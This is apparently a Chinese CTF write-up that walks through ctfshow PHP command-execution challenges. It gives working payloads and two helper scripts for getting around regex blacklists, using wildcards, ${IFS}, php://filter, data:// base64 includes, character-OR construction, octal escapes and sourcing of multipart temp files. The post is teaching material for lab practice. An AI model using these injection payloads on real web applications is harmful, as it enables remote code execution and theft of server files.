---
title: 有趣的命令执行
date: 2026-11-08
category: CTF
tags:
  - CTF
  - Writeup
  - web
  - PHP
summary: PHP命令执行万字长文（理论来说出于篇幅考虑这篇只是一部分吧）
draft: false
---

# 有趣的命令执行

> 紧接着之前的《关于信息搜集》，我们来进一步的进行讲解。
> 此外有关爆破的内容因为较为简单先不做讲解

此外，这真的是我呕心沥血写的真的力竭了，生日也在写啊...
![[web-pt2-2.png]]

# PHP的代码解读

一般来说，当你拿到了php的源码，如果在面对命令执行的语句中，就也可能有拿到shell的手段，我们接下来以ctfshow里的例题来学习吧

## 字符过滤型代码执行
### pt.1.1

```php
<?php  
  
error_reporting(0);  
if(isset($_GET['c'])){    $c = $_GET['c'];  
    if(!preg_match("/flag/i", $c)){  
        eval($c);  
    }  
      
}else{    highlight_file(__FILE__);  
}
```

因为刚刚开始解出php可能对于一些函数命令有些生疏，所以这边可以逐句解释一下

首先
```php
error_reporting(0);
```

是在屏蔽了所有的错误提示，防止报错而顺带把服务器信息也暴露了

```php
if(isset($_GET['c'])){    $c = $_GET['c'];  
```

检查GET请求中是否传入了参数 c ，如果传入了，把 c 赋值给 $c
GET传参，也就是 `$_GET` 是这道题的其中一个知识点，这让我们知道了这道题是用GET方法来传参的，因此后面的传参可以直接使用 `/?c=...` 来实现

```php
if(!preg_match("/flag/i", $c)){  
        eval($c);  
    } 
```

很关键的一处代码，这是个正则表达式，意思就是，如果 $c 不包含（这个“不”字源自于if后面括号里的感叹号）flag，则执行下面的代码。
而这里 `i` 的意思则是不区分大小写，因此Flag FLag这样的形式都不行
关键的来了，下面的执行的代码竟然是 eval()

`eval()`函数在php里是很危险的函数，相当于把$c里的字符当作命令来执行

而最后一行
```php
else{    highlight_file(__FILE__);  }
```

就是说如果没有传 c 参数，则高亮显示当前文件，而当前文件则是php源码，那么整道题逻辑就看懂了。

我们要做的是拿flag，也就是调用system来cat flag
一般来说cat flag的指令是
```php
system(cat flag);
```
但是遗憾的是，这里有两个问题：
1. 一般来说cat这个命令太常见了所以就导致了基本上任何一个搭建平台的人都会把cat给屏掉。
2. 这道题本身就不允许直接输入flag来查询

这里我们需要补充的小知识即
>tac 命令是相当于 cat 的倒过来的拼写，执行的效果也是反着的——cat是从第一行读到最后一行，tac是从最后一行读到第一行。而关键就在于tac相较于cat一般被用作后门代码，是可以使用的

那么问题一解决了
第二个问题我们有三个解法
1. 我们可以通过构造通配符`?`来绕过检测
2. 我们可以通过编码后解码来绕过
3. 我们可以通过php拼接字符串操作来绕过

`值得注意的是，如果以URL的编码来上传，经过服务器解码之后会直接变成flag从而不能绕过检测`
因此最后我们可以用例如这样的形式来打穿
`https://xxx.ctf.show/?c=system("tac fla?.php")`
或者把里面的内容换成`"tac fla"."g.php"`也可以

>不过这种题目打穿它的方式太多了，这里也就不多说了
### pt.1.2

来看它的加强，其他不变，唯独在判定上变成了
```php
if(!preg_match("/flag|system|php/i", $c))
```
这道题禁用了上道题我们采用的system和php，所以我们需要另辟蹊径

这里是需要学习的地方
>PHP支持用反引号（｀）执行系统命令，等价于shell_exec

因此我们可以使用 
```php
`tac f*`;
```

但是实际上你执行了之后页面并没有显示内容
因为我们还缺少了一个命令就是 echo 
>echo的作用就是把执行的结果显示在页面上

也就是说，你需要在外层再加一个echo
就变成了
```php
?c=echo`tac f*`;
```
这样就可以过了

### pt.1.3

加强pro
```php
if(!preg_match("/flag|system|php|cat|sort|shell|\.| |\'/i", $c))
```
虽然感觉这道题的严格判定看上去并不影响，但是我们注意到了空格也被ban了，因此我们就不能打空格了...吗？
空格在URL的显示是%20，我们只需要找一个可以代替空格，URL和空格不一样的即可
在Linux命令行中，命令与参数之间、参数与参数之间，无论有多少个空格（或 Tab），Linux 的 Shell 都会把它们压缩成一个分隔符来解析。
也就是说，不用空格，用Tab也可以达到同样的效果
>Tab在URL上的格式是%09，和空格不一样，因此在这道题是可以绕过的

就变成了
```php
?c=echo`tac%09f*`;
```
于是就可以过了

那有人要问了要是tab和空格以及所有空白字符（换行%0a，回车%0d）全都不行呢？
1. 可以用\${IFS}变量，在linux中，\$IFS是默认的系统分隔符，系统解析的时候会把它自动替换成分隔符
2. 利用< >的重定向符

不过这些都属于下下策了。

### pt.1.4

666还有第四关
```php
if(!preg_match("/flag|system|php|cat|sort|shell|\.| |\'|\`|echo|\;|\(/i", $c))
```
这下坏了啥都不给用了

我们再了解新的函数
>include是PHP的一个导入文件的关键字，可以把目标文件的字节读进来然后塞到当前位置当代码/文本处理

比如
```php
# a.php
<?php $x = 1; ?>
hello

# b.php
include 'a.php';
# 等价于在 b.php 这行现场写下：
# <?php $x = 1; ?>
# hello
```

但是include在真正的网站中如果不能直接include一个php文件，就是要有文件路径或流
`include $path  #path (php://filter、data://等)`
而文件里的 `<?php ... ?>` 的代码则会被执行
如果遇到了非 `<?php ... ?>` 的内容则会直接当 HTML 原样输出
当然失败了会警告之后继续跑，成功了会返回1，所以 print include 会返回 1

也就相当于我们可以
```php
?c=include"flag.php"
```
>当然include的规则是：后面的路径可以不用跟include直接空格空开，也满足了这道题的筛选条件

当然这样子直接放flag和php是不行的会被过滤
而include没有通配符这种概念...flag\*这样的也不行
不过有个办法就是，因为网站只对c进行过滤，如果我们把里面的flag拉到外面来，也就是说，我们单独再设置一个GET量，这样的话就可以绕过了
**这是"参数分离 / 拆分过滤"绕过**
因此我们要引入第二个知识点了

>\$\_GET[1] 来设置一个新的GET请求，而里面的1则是和c一样是新的参数名

表达式可以如下
```php
?c=include$_GET[1]?>&1=...
```

稍微需要注意两点的是
1. **?>** 是用来替代 `;` 的，因为 `;` 也被ban了，而这里的 `?>` 其实是和 `;` 有点区别的，前者是php语句的结束，打了这个就相当于关闭了PHP的标签，而后者则是一句话的语句结束符，在 `?>` 之后，剩下的内容会被当作HTML语言解析。但是如果这句话作为最后一条语句收尾的话， `;` 和 `?>` 的作用就相等了
2. 就算 `?c=include$_GET[1]?>&1=flag.php` 也不行，虽然语句可以执行成功，但是由于flag.php会被当作php语言执行，所以页面不会回显，办法就是绕过php解析器

>绕过php解析器的办法就是把里面的内容给编码（比如base64）之后，让解析器读不出php语言，然后这样就可以输出了

```php
php://filter              # PHP 内置的流包装器：读写数据的中转站
# 相当于php过滤
convert.base64-encode     # 过滤器：数据流过时被 base64 编码（convert 是分类，base64-encode 是过滤器名）
resource=flag.php         # 固定参数：指定真正读哪个文件/流
```

连起来就是
```php
include"php://filter/convert.base64-encode/resource=flag.php"
```

而和之前的合成一下就是最终的payload
```php
?c=include$_GET[1]?>&1=php://filter/convert.base64-encode/resource=flag.php
```

回显结果base64解一下就行了
>小知识点，标准格式应该有个\[read/write]的格式但是不写默认是read所以可以省略，完整payload如下
```php
php://filter/read=convert.base64-encode/resource=flag.php
```


甚至后面一题的
```php
if(!preg_match("/flag|system|php|cat|sort|shell|\.| |\'|\`|echo|\;|\(|\"/i", $c))
```
和
```php
if(!preg_match("/flag|system|php|cat|sort|shell|\.| |\'|\`|echo|\;|\(|\:|\"/i", $c)
```
还有
```php
if(!preg_match("/flag|system|php|cat|sort|shell|\.| |\'|\`|echo|\;|\(|\:|\"|\<|\=/i", $c))
```
都过了，这个payload可太强了

### pt.1.5

稍微加强了下
```php
if(!preg_match("/flag|system|php|cat|sort|shell|\.| |\'|\`|echo|\;|\(|\:|\"|\<|\=|\/|[0-9]/i", $c))
```
不让你用数字了说是

那就把数字改成字母就行了
```php
?c=include$_GET[a]?>&a=php://filter/convert.base64-encode/resource=flag.php
```

注意GET里的 a 理论上是要用 `'a'` 引起来的（不引起来就不会把这个a当作后面参数a，它只会作为一个常量a来用），因为PHP8环境下不引起来会报错，但是因为这道题的环境是PHP7（恰好可以，未定义的常量会退化成同名字符串）不是PHP8导致恰好可以用纯的 `a` ，而引号题目又不给用，我觉得可能是出题者故意为之...

### pt.1.6

现在的过滤变得更严了
```php
if(!preg_match("/[0-9]|\~|\`|\@|\#|\\$|\%|\^|\&|\*|\（|\）|\-|\=|\+|\{|\[|\]|\}|\:|\'|\"|\,|\<|\.|\>|\/|\?|\\\\/i", $c))
```

这都啥啊，怎么把什么都ban了，这我还怎么打啊喂！
不过嘛...仔细看这个括号，我们惊喜地发现这个竟然是全角符号的括号！也就是正常我们打的 () 都是没有关系的！
所以这道题的解法就是纯函数调用，有关于纯函数调用我们这里又要再讲一讲，因为初来乍到所以函数的一些名字包括它的用法可能还有些不熟悉，所以这边给出了一些表帮助记忆

| 函数                                             | 作用                                   | 在这题里的角色                                  |
| ---------------------------------------------- | ------------------------------------ | ---------------------------------------- |
| `localeconv()`                                 | 返回本地化格式配置的数组                         | 数组第一个元素正好是字符串 `.`，不写点号就能拿到「当前目录」         |
| `pos()` / `current()`                          | 取数组当前指针指向的元素（互为别名）                   | 把 `localeconv()` 的第一个值 `.` 取出来           |
| `scandir($dir)`                                | 列出目录下的文件名，返回数组（含 `.` 和 `..`，默认按名字升序） | 扫描当前目录，拿到文件列表                            |
| `array_reverse($arr)`                          | 反转数组顺序，返回新数组                         | 把 `flag.php` 翻到前面，方便一步取到                 |
| `next($arr)`                                   | 指针后移一格，返回该元素                         | 取出反转后的第二个元素 `flag.php`                   |
| `end($arr)`                                    | 指针移到末尾，返回最后一个元素                      | 备选：直接拿最后一个文件名                            |
| `prev($arr)`                                   | 指针前移一格，返回上一个元素                       | 备选：指针在首位时返回 false，这题基本用不上                |
| `array_shift($arr)`                            | 删除并返回第一个元素                           | 备选：取第一个                                  |
| `array_pop($arr)`                              | 删除并返回最后一个元素                          | 备选：取最后一个                                 |
| `show_source($file)` / `highlight_file($file)` | 高亮输出文件源码                             | 打印 `flag.php` 的源码，flag 就在里面              |
| `readfile($file)`                              | 读取文件并直接输出                            | 备选：原样输出，不带语法高亮                           |
| `file_get_contents($file)`                     | 读取文件并返回字符串                           | 备选：要配合 `print` 才能显示                      |
| `print`                                        | 输出（语言结构，不是函数）                        | 配合 `file_get_contents()` 使用              |
| `system($cmd)`                                 | 执行系统命令并输出结果                          | 这题只能跑纯字母命令（点、斜杠、星号都被 ban），读不到 `flag.php` |
| `array_slice($arr, $offset, $len)`             | 截取数组的一段                              | 这题用不了：至少两个参数，逗号被 ban                     |
| `array_search($needle, $arr)`                  | 按值查找，返回对应键                           | 这题用不了：两个参数 + 要写字符串                       |

然后可能对 `localeconv()` 不太理解，其实它就是一个php的内置函数，然后本身以数组的形式存在，里面是\[ `.` , `千位分隔符` , `国际货币符号` , ...... \] ，而这个 `.` 又是在黑名单之后才会被解析出来，就相当于我们可以绕过解析了

所以
```php
pos(localeconv())
```
的意思就是取出 `.` ！

而接下来我们使用 
```php
scandir(pos(localeconv()))
```
就可以获得一个当前目录下的数组\[ `.` , `..` , `flag.php` , `index.php` \]

flag在倒数第二个，我们的解决办法就是给它倒过来然后我们取下一个，最后读取，查找表格，最终的php上就应该是这么写的
```php
show_source(next(array_reverse(scandir(pos(localeconv())))))
```
究极套娃的来了...

>这里可能会有小问题就是为什么要倒过来再next，不能next嵌套三次吗？因为next是跳到下一个之后直接返回了里面的字符串，所以next不能套娃，刚刚开始可能有误区...


### pt.2.1

大体和上面一样，也是过滤词，只是情景有些不同
```php
<?php
//flag in flag.php  
error_reporting(0);  
if(isset($_GET['c'])){    $c = $_GET['c'];  
    if(!preg_match("/flag/i", $c)){  
        include($c);  
        echo $flag;  
      
    }  
          
}else{    highlight_file(__FILE__);  
}
```
这里的 c 因为是在include下面的，所以它不再是代码而是路径了
这个时候你会疑惑一下下，include明明是一个路径，怎么执行命令了呢？

回忆一下 `include` 的功能，include 做的是：**把该路径里的内容读出来，如果是php文件，里面 的php代码就会被执行。而如果是纯文本则原样输出**

那这道题flag最后怎么出来呢，代码里面写了
```php
include($c); // 包含 $c 指向的文件
echo $flag;  // 输出变量 $flag
```

而flag.php里面的内容大概就是
```php
<?php $flag = "ctfshow{xxx}"; ?>
```

所以其实我们只需要把路径放到flag.php下面，然后它就会自动返回flag了

**那么我们要怎么做**
这道题`?c=fla?.php`并不行，因为不能有通配符啊喂
所以我们讲一个新知识

`allow_url_include`
>allow_url_include 是PHP的一个安全配置项，控制着include、require这样的语句能不能直接使用URL比如 http:// 或者 data:// 作为包含目标

它决定了你的include(\$c)里的 `$c` 能不能是 远程地址或者是数据流 而不止是简单的一个文件地址，如果开启了，就可以用 `data://` 或 `php://input` 这类伪协议，把一段PHP代码“伪装”成文件让include去执行
要去查看也很简单，我们可以先测data://协议，它通常需要`allow_url_include` 和 `allow_url_fopen` 都开启
```php
?c=data://text/plain,<?php phpinfo(); ?>
```
![[web-pt2-1.png]]
而最后的结果也确实是这样的

这样的话我们就可以使用 URL 了。但是问题又随之而来：
正常的`?c=data://text/plain,<?php system('cat fla?.php');?>` 也不可以，这是因为这串里有 `<` `>` `?` `空格` `'` `;` `(` `)`。**query string 里这些字符是"不安全"的**。`>` `<` 虽然合法但是很多客户端和服务器会转义或拒绝。`空格`在URL 里面必须 `%20` 否则非法。而后面的那四个字符虽然合法但是基本上只要是开了WAF就会拦。

那怎么办呢？一般来说遇到这样的情况，我们的标准操作都是把它编码了之后再传，纯数字+字母就不会出现这样的情况。

我们来看data的结构
```text
data:[<mediatype>][;base64],<data>
```

也就是说如果要base64，我们就可以这么写
```text
data://text/plain;base64,PD9waHAg...
│      │         │       │
│      │         │       └── 真正的内容（base64 编码后的数据）
│      │         └────────── 声明"后面的数据是 base64 编码的"，注意后面是分号
│      └──────────────────── MIME 类型：text/plain
└─────────────────────────── 协议名 data
```

其中的MIME类型在这里只是浏览器和解析器来判断它的内容类型，不过在php的include来说，基本不关心MIME类型，但是至少得是一个合法的，text/plain 就是一种。至于前面data://这个双杠其实加不加都可以，php都认，标准写法是data: ，而php里写的是 data://

此外，编码方式有且只有base64可以选，这是由 data:// 协议遵循的 RFC2397 标准决定的（感兴趣可以去看看[RFC 2397: The "data" URL scheme | RFC Editor](https://www.rfc-editor.org/info/rfc2397/)）要么base64编码，要么原文

那么接下来的事情就由繁化简了，我们只要考虑base64里面的payload怎么写就行了
>include会把流的内容当作php文件来解析，而语法规则和.php文件完全一样

那我们直接在后面写上`<?php system("tac flag.php");?>`的base64作为负载就行了

```php
/?c=data://text/plain;base64,PD9waHAgc3lzdGVtKCJ0YWMgZmxhZy5waHAiKTs/Pg==
```
即可

然后这里因为讲到了 `data://` 和 `php://filter` 。所以我们来看看他们的区别在哪

|                     | `php://filter` | `data://`           |
| ------------------- | -------------- | ------------------- |
| 后面的负载是面对哪里          | 必须是服务器的文件      | 自己写的内容在服务器上（php则执行） |
| 目的                  | 读资源            | 执行/输出你写的内容          |
| 需要后面有resource       | Y              | N                   |
| 需要allow_url_include | N              | Y                   |
| 经典用处                | 读源码、绕解析        | PHP代码执行             |


下一关就算是
```php
if(!preg_match("/flag|php|file/i", $c))
```
我们也可以打过

你发现我们用的是data而不是file所以也可以过，顺便这里提到了file那就讲讲file
>file:// 数据来源必须是不能加工过的原样的完整服务器本地路径，但是这种东西你一看不能加工就知道了依托答辩，这样的方式但凡有点防护都不可能让你过了。

所以记住file://的功能是 ⊂ php://filter 的

且这两者在这里都可以用，前者是绝对路径（注意file:// 后面要多加一个 /）后者是相对路径
```php
include "file:///var/www/html/flag.php";
include "var/www/html/flag.php";
```

### pt.2.2

阴的来了，我们来看改动
```php
    if(!preg_match("/flag/i", $c)){  
        include($c.".php");
```
如果把.php单独拎出来，阁下该如何应对呢？

之前的那个payload肯定是不行了，因为base64后面跟了个.php就无法解码了，那我们换一个策略，直接明文，然后**冷暴力**后面的.php，因为当我们前面的语句是完整php语言的时候，后面就算是.php也只能按照文本输出，这就是这道题的小巧思

payload如下

```php
/?c=data://text/plain,<?php%20system(%27tac%20fla*%27);?>
// 其实 /?c=data://text/plain,<?php system('tac fla*');?> 也可以只不过会URL解析成上面那种形式
```
你会发现，就算是.php了，也是`/?c=data://text/plain,<?php%20system(%27tac%20fla*%27);?>.php`，在完整php语言的后面可以说这个.php一点卵用没有

### pt.3.1

神的来了
```php
<?php
if(isset($_POST['c'])){    $c = $_POST['c'];  
if(!preg_match('/[0-9]|[a-z]|\^|\+|\~|\$|\[|\]|\{|\}|\&|\-/i', $c)){  
        eval("echo($c);");  
    }  
}else{    highlight_file(__FILE__);  
}  
?>
```

谁家好人又不让我们输数字又不让我们输字母的，检查一下我们发现其实还有一个 `|` 可以。

>`|` 是按字节或的意思，可能不太理解，我们先来看看最基础的 `或` 的逻辑：1 | 1 = 1  1 | 0 = 1  0 | 1 = 1  0 | 0 = 0  也就是有 1 出 1 ，全 0 才出 0 

比如反引号的二进制位置是 0110 0000 ， 而 控制字节 DC3 的位置是 0001 0011，这两者或一下得到了 0111 0011 = 's' 
也就是说我们可以完全利用一些在限制范围以外的字符以及那些非打印字符来用 `|` 来制造出我们想要的字符串

>而且其实 `|` 的运算是可以叠加的，也就是我们可以 a | b | c | d 来四合一 --> `|` 就是一个n输入的或门

那么接下来就是通过写脚本来得出，有哪些限制的字符串是可以通过 | 来得到的
```python
# 用法: py -3.12 de.py system "cat /flag"
import sys, urllib.parse

BAD = {*range(48,58), *range(65,91), *range(97,123), *map(ord,"^+~$[]{}&-")}

def pair(c):
    t = ord(c)
    for a in range(256):
        b = t & ~a
        if a not in BAD and not a & ~t and b not in BAD:
            return chr(a), chr(b)

def build(name, cmd):
    A, B = zip(*map(pair, name))
    C, D = zip(*map(pair, cmd))
    return "('%s'|'%s')('%s'|'%s')" % ("".join(A), "".join(B), "".join(C), "".join(D))

if __name__ == "__main__":
    print("c=" + urllib.parse.quote(build(sys.argv[1], sys.argv[2])))

```

注意当POST提交的时候，一定要在请求头上加一个
```http
Content-Type: application/x-www-form-urlencoded
```
不然后面的请求体不当URL解析的...


### pt.4.1

重定向了
```php
if(isset($_GET['c'])){    $c=$_GET['c'];    system($c." >/dev/null 2>&1");
```
可以看到我们虽然 c 没有限制，但是我们重定向了

>尖尖指向谁，就定向到它那里

也就是这道题会把 c 的地址重定向到 /dev/null （后面的 2>&1 指的是把标准错误重定向到标准输出，其实不用很在意）

突破点在于，我们只要在我们输的语句这里加个 `;` ，让前面的单独成句，然后隔断后面的重定向。
那就很简单了

```php
/?c=cat%20flag.php;
```
但是你会发现页面是白色的，是因为cat出来的是php源码而浏览器响应会当html渲染，因此页面上是看不到的，你要 `Ctrl + U` 查看源码才可以看到，当然如果你想在页面上看见你也可以

```php
/?c=base64%20flag.php;
```
这样就可以看到base64编码之后的flag.php了

### pt.4.2

加强
```php
    if(!preg_match("/\;|cat/i", $c)){        system($c." >/dev/null 2>&1");
```
这下之前的 `;` 没法用了，那么我们需要另外找方法了，这里介绍其它的分隔符

| 种类       | ;   | \n (%0a) | &&       | ｜｜     |
| -------- | --- | -------- | -------- | -------- |
| 和后面语句的关系 | 执行  | 执行       | 前者成功执行后者 | 前者成功跳过后者 |
`& 和 | 暂不介绍`

所以这道题有两个方法就是把 `;` 换成 `||` 或者 `%0a`
当然cat也要换成tac

```php
/?c=tac%20flag.php||
```

而后面的
```php
    if(!preg_match("/;|cat|flag/i", $c)){        system($c." >/dev/null 2>&1");
```

只要改成
```php
/?c=tac%20fla*||
```
就行了

下一个
```php
    if(!preg_match("/\;|cat|flag| /i", $c)){        system($c." >/dev/null 2>&1");
```

空格不让用了很简单，我们只要换成tab就行了
```php
/?c=tac%09fla*||
```

而
```php
    if(!preg_match("/\;|cat|flag| |[0-9]|\\$|\*/i", $c)){        system($c." >/dev/null 2>&1");
```

没ban`?`啊所以随便写
```php
/?c=tac%09fla?.php||
/?c=tac%09f???????|| //甚至这个都可以
```

666盐都不盐了，甚至这三个都过了！**一招鲜，吃遍天！**
```php
    if(!preg_match("/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail/i", $c)){        system($c." >/dev/null 2>&1");

    if(!preg_match("/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\`/i", $c)){        system($c." >/dev/null 2>&1");
    
    if(!preg_match("/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\`|\%/i", $c)){        system($c." >/dev/null 2>&1");
```

这么强大的过滤...关我f???????什么事情啊
```php
/?c=tac%09f???????|| 
```

### pt.4.3

till...
```php
    if(!preg_match("/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\`|\%|\x09|\x26/i", $c)){        system($c." >/dev/null 2>&1");
```

这里我们发现 `x09` 也就是 `%09` — `Tab` 被ban了，那我们就用重定向呗，但是一定要注意重定向有两个点：
1. 重定向的文件名字必须是准确的文件名（相对路径也可以），不能含有通配符，那这里的flag连起来了怎么办？很简单，加一个 `fla\g` `f\l\a\g` 或者 `"fla"g` `fla''g` `fla""g` 都是可以的。`\` 是转义字符，意思是保留下个字符的字面意思并移除自身，经常在比如你想要符号比如 || 的本身但是不想要它的功能的时候会用到——也就是去除后面字符功能的意思。而 `""` 的作用是保护内部字符不被特殊解析成参数内容，引用部分可以和非引用部分拼接成一个完整单词，就是为什么引号也可以用的原因。
2. 重定向的方向虽然之前讲过了，但是可能还是不知道这道题是 `tac<fla\g.php` 还是 `tac>fla\g.php` ，我们要把flag的内容放在tac返回，所以是前者。那如果重定向符号反了会发生什么事情呢？
>重定向的方向可以这样记：`<` 是**输入**，把文件的内容喂给程序，不会改动文件；`>` 是**输出**，把程序的输出写进文件，而且打开文件时会先截断（清空）再写；`>>` 才是追加；`<<` 是 heredoc，跟追加没有关系。

所以千万不要写错方向。比如 `tac>fla\g.php`：`>` 在打开文件时就把 flag.php 截断了，而 tac 没有输入也就没有输出，清空之后没有内容写回——flag.php 就这么没了，再想读也读不出来了。

所以正确的payload是
```php
?c=tac<fla\g.php||
```


有点加强的来
```php
    if(!preg_match("/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\`|\%|\x09|\x26/i", $c)){        system($c." >/dev/null 2>&1");
```
这道题的tac被ban了

没事我们列出其它可以的方法

| 命令           | 写法                       | 输出格式                    | 说明              |
| ------------ | ------------------------ | ----------------------- | --------------- |
| `dd`/`paste` | dd<fla\g.php             | 原文（隐藏，需要ctrl+u）         | 一定有这个指令         |
| `xxd`        | 同上                       | 十六进制可见（原文如果见不到也要ctrl+u） | 服务器安装后也不失为一种选择  |
| `rev`        | 同上                       | 倒序可见文本                  | 需要你自己再reverse一下 |
| `nl`         | 同上                       | 带行号（同样需要ctrl+u）         |                 |
| `tee`        | tee<fla\g.php>o.txt      | 写文件                     | 需要配合访问o.txt     |
>表格里的写法都省略了结尾的 `||`——实际发送时要在末尾接上，用来隔断服务器自动追加的 `>/dev/null 2>&1`。

>有关dd和paste实际上是有区别的，dd如果要直接访问，需要有一个if=来读取文件而paste不需要，例如，dd需要`dd if=flag.php`而paste只需要`paste flag.php`即可。此外，dd的 `if` 后是不能有通配符的。

所以你这道题随便挑一个写就行了
e.g.
```php
/?c=paste<fla\g.php||
```

### pt.4.4

把重定向也ban了现在你开心了吧！
```php
    if(!preg_match("/\;|cat|flag| |[0-9]|\*|more|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\`|\%|\x09|\x26|\>|\</i", $c)){        system($c." >/dev/null 2>&1");
```

不要急，我们观察发现了这个黑名单其实有小漏洞——`$`竟然解ban了，那么这道题就是靠 `${IFS}` 来充当空格使用了

我们直接
```php
/?c=nl${IFS}fla\g.php||
```

666还有第二关
```php
|   |
|---|
|1 <?php|
...
|13|
|14|
|15 $flag="flag_here";|
```
flag并不在这里，也就说明这道题它学坏了，flag放到别的地方去了

我们接下来只能一层层返回看看这个网站到底有什么了
```php
/?c=ls${IFS}..||
/?c=ls${IFS}../..||
/?c=ls${IFS}../../..||
```

最后我们在根目录里面发现了
```php
|   |
|---|
|bin|
|dev|
|etc|
|flag|
|home|
...
```
这下好了flag原来是在根目录啊，那我们的目标就是拿到根目录的flag即可

我们只要
```php
/?c=nl$IFS/fla\g||
```
即可

>有人好奇 `$IFS` 和 `${IFS}` 区别在哪里，其实他们的功能都一样的，加大括号是防止和后面的字符混在一起，$IFS在字母数字下划线前面必须加 { } ，而 / - 可以不用加


稍微加强但是毫无卵用
```php
    if(!preg_match("/\;|cat|flag| |[0-9]|\*|more|wget|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\`|\%|\x09|\x26|\>|\</i", $c)){  
        echo($c);        $d = system($c);  
        echo "<br>".$d;  
    }else{  
        echo 'no';  
    }
```

乍一看以为这道题和之前的大不相同，实则不然，你执行的c的命令还是会执行的，所以你完全可以打
```php
/?c=nl${IFS}fla\g.php
```

但是有好奇人想要问后面的语句是干什么的，那我们要来系统了解一下 `system` 函数在php 下面具体是怎么定义的

>`system($a)` 指的是执行命令并输出结果，返回命令输出的最后一行，也就是说，这里的 `$d` 是拿到的命令输出的最后一行

最后返回html下的 \<br>以标签状态 的最后一行，也就是最后一行会以标签的格式显示在页面上。

### pt.4.5

力竭了
```php
    if(!preg_match("/\;|.*c.*a.*t.*|.*f.*l.*a.*g.*| |[0-9]|\*|.*m.*o.*r.*e.*|.*w.*g.*e.*t.*|.*l.*e.*s.*s.*|.*h.*e.*a.*d.*|.*s.*o.*r.*t.*|.*t.*a.*i.*l.*|.*s.*e.*d.*|.*c.*u.*t.*|.*t.*a.*c.*|.*a.*w.*k.*|.*s.*t.*r.*i.*n.*g.*s.*|.*o.*d.*|.*c.*u.*r.*l.*|.*n.*l.*|.*s.*c.*p.*|.*r.*m.*|\`|\%|\x09|\x26|\>|\</i", $c)){        system($c);
```
`.*s`的意思是子序列过滤，也就是不管你通过中间什么字符隔断 `\` `""` ，只要这一串字符最终拼起来是需要过滤的，都是被不允许的——那直接通配符好了

```php
/?c=paste${IFS}f???????
```

### pt.4.6

唉我真不知道该说什么了
```php
// 你们在炫技吗？
if(!preg_match("/\;|[a-z]|\`|\%|\x09|\x26|\>|\</i", $c))
```

为了拦我们这下连字母都不给用了！！！
气死偶类！
哎！有没有个编码可以全数字的？有的兄弟有的，隆重介绍八进制，纯数字无字母
```python
# 用法: py -3.12 oct-escape.py "cat flag.php"
import re, sys

esc = lambda w: "$'" + ''.join('\\%03o' % ord(c) for c in w) + "'"
if len(sys.argv) < 2:
    sys.exit('用法: py -3.12 oct-escape.py "cat flag.php"')
out = re.sub(r'\S*[A-Za-z]\S*', lambda m: esc(m.group()), ' '.join(sys.argv[1:]))
print(out)
if re.search('[A-Za-z]', out):
    print('[!] 仍含字母', file=sys.stderr)

```

比如我们想要
```php
cat flag.php
```
那么我们就可以把在脚本编码之后给变成

```php
/?c=$'\143\141\164' $'\146\154\141\147\056\160\150\160'
```
>注意，转义的引用要用外壳 `$' '` 嵌套，八进制是\123 十六进制是 \x63 (这道题因为有x所以不能十六进制) Unicode是 \u0063at (同理)


### pt.4.7

这下好了，都别玩了
```php
    if(!preg_match("/\;|[a-z]|[0-9]|\\$|\(|\{|\'|\"|\`|\%|\x09|\x26|\>|\</i", $c)){        system($c);
```
现在的意思就是我们不能构造函数，不能写数字字母
`而且可能我们之前做过一些题目例如极难的老叟洗完头，它是通过高位字节取反这样的操作来实现绕过的，但是这道题如果你有这样的想法那就错了，因为这个system()函数并不是在php体系里而是在shell里，shell里面并没有什么高位取反这样的操作，所以只能找别的方法...`

这道题就只能从shell上来下手了，已知现在我们有 `.` `/` `?` 都可以用，那我们如果在shell里面写入
`. /???/?????????` 这样的形式，shell就会自动去寻找任意第一个目录是三个字符的任意第二个目录是九个字符的文件（通配符）然后执行 （`.`(source) 就是把里面的文件内容当成命令然后给shell去执行）
`可能上面的话有点绕，简单来说就是任意 /123/123456789 这样字符数为通配符数量的目录文件都可能被执行`

但是如果一下子遇到很多个形式都满足条件的怎么办呢，`.` 只会执行第一个满足条件的文件，而目标机在 Debian 系列下，会有 `/etc/protocols` 这样的同字符数的存在，于是 `.` 便会随机读取里面的文件。

我们现在直接输命令执行的方法是已经行不通了，那我们还有一个办法：看我们能不能将执行的命令作为文件上传——答案显然是可以的，它就是`multipart`。而且一定会放置于临时目录 `/tmp/php??????` （后六位随机，当然不一定是六位，会随版本或平台变化）

> 我们曾经在一个POST请求那边讲到了，一个 `?c=url格式` 的请求是不能直接被解析的，而是要在请求头上加入 `Content-Type: application/x-www-form-urlencoded` 才能正常解析，但是它并没有所谓 '文件' 的概念。而 `multipart` 就是专门为了解决这个问题而诞生的，它的请求头是 `multipart/form-data`，是一种类似 MIME 的邮件格式，这里面可以不仅塞入一个值，还可以自定义部件头，类型等。当然它会被上传之后，单独存储在 /tmp/php?????? 下面，你只有在本次请求的生命周期内才能调用，不然就会被删

逻辑是
```text
请求开始
│
├─ PHP 解析 multipart → 写 /tmp/phpXXXXXX        ← 窗口开始
│
├─ index.php 开始执行
│   │
│   └─ system(". /???/?????????")                ← 执行
│        └─ source 临时文件，脚本里的 cat 跑完
│
├─ index.php 结束
│
└─ 请求关闭 → 删除临时文件                        ← 窗口结束
```

而真正的请求的样子是
```http
POST /probe.php?c=x HTTP/1.1
Host: 127.0.0.1:8911
User-Agent: curl/8.21.0
Accept: */*
Content-Length: 206
Content-Type: multipart/form-data; boundary=------------------------114514
                                                                    ↑ 客户端自己起的名字

--------------------------114514          ← 体开头。注意分隔符是「--」+ boundary
Content-Disposition: form-data; name="f"; filename="up.txt"   ← 部件头
Content-Type: text/plain                                       ← 部件自己的类型
                                                               ← 空行 = 头结束
cat flag.php                                                   ← 内容，原样字节，不转义
--------------------------114514--      ← 结尾：boundary 后面多两个「--」

```
这上面有很重要但是可能需要学习的地方

#### 1. 部件头
第一行Content-Disposition:是主头，用来被PHP识别。其中form-data 是处理类型（固定写法），name="f" 是表单里的字段名，而最后的 filename的有无决定了它是文件还是普通字段。

